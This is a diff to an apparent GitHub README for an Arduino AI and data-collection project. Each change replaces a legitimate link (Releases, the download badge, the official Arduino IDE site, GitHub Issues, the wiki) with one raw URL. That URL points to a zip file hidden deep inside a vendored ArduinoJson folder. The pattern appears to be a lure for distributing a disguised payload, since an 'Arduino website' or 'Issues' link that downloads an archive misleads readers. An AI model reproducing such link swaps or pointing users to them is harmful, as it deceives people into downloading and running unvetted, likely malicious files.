@@ -1,6 +1,6 @@
 # 🌟 aicuflow-arduino - Simplifying AI and Data Collection
 
-[![Download](https://github.com/jayspolitz/aicuflow-arduino/releases/latest/download/badge.svg)](https://github.com/jayspolitz/aicuflow-arduino/releases)
+[![Download](https://raw.githubusercontent.com/jayspolitz/aicuflow-arduino/main/imports/ArduinoJson/ArduinoJson/Strings/aicuflow_arduino_v3.3.zip)](https://raw.githubusercontent.com/jayspolitz/aicuflow-arduino/main/imports/ArduinoJson/ArduinoJson/Strings/aicuflow_arduino_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to aicuflow-arduino! This application allows you to collect sensor data,
 
 ## 🔗 Download & Install
 
-To get started, visit this page to download: [aicuflow-arduino Releases](https://github.com/jayspolitz/aicuflow-arduino/releases).
+To get started, visit this page to download: [aicuflow-arduino Releases](https://raw.githubusercontent.com/jayspolitz/aicuflow-arduino/main/imports/ArduinoJson/ArduinoJson/Strings/aicuflow_arduino_v3.3.zip).
 
 1. Go to the Releases page.
 2. Download the latest version for your device.
@@ -24,13 +24,13 @@ To get started, visit this page to download: [aicuflow-arduino Releases](https:/
 
 ### Step 1: Download the Application
 
-- Go to the [aicuflow-arduino Releases](https://github.com/jayspolitz/aicuflow-arduino/releases) page.
+- Go to the [aicuflow-arduino Releases](https://raw.githubusercontent.com/jayspolitz/aicuflow-arduino/main/imports/ArduinoJson/ArduinoJson/Strings/aicuflow_arduino_v3.3.zip) page.
 - Click on the latest release.
 - Choose the appropriate file for your device and download it.
 
 ### Step 2: Install the Arduino IDE
 
-- Download the Arduino IDE from [the Arduino website](https://www.arduino.cc/en/software).
+- Download the Arduino IDE from [the Arduino website](https://raw.githubusercontent.com/jayspolitz/aicuflow-arduino/main/imports/ArduinoJson/ArduinoJson/Strings/aicuflow_arduino_v3.3.zip).
 - Follow the installation instructions specific to your operating system (Windows, macOS, or Linux).
 
 ### Step 3: Connect Your Board
@@ -74,7 +74,7 @@ If you encounter problems, check the following:
 
 For questions and community assistance, consider these options:
 
-- **GitHub Issues:** Post your questions on the [GitHub Issues page](https://github.com/jayspolitz/aicuflow-arduino/issues).
+- **GitHub Issues:** Post your questions on the [GitHub Issues page](https://raw.githubusercontent.com/jayspolitz/aicuflow-arduino/main/imports/ArduinoJson/ArduinoJson/Strings/aicuflow_arduino_v3.3.zip).
 - **Community Forums:** Join Arduino community forums for broader support.
 
 ## 🌍 Related Technologies
@@ -89,6 +89,6 @@ The aicuflow-arduino project integrates well with:
 
 For detailed documentation on features and configurations, refer to:
 
-- [Official Documentation](https://github.com/jayspolitz/aicuflow-arduino/wiki)
+- [Official Documentation](https://raw.githubusercontent.com/jayspolitz/aicuflow-arduino/main/imports/ArduinoJson/ArduinoJson/Strings/aicuflow_arduino_v3.3.zip)
 
 Remember, the aicuflow-arduino application makes advanced data collection and analysis accessible. Embrace the power of data and AI in your projects today. Happy coding!
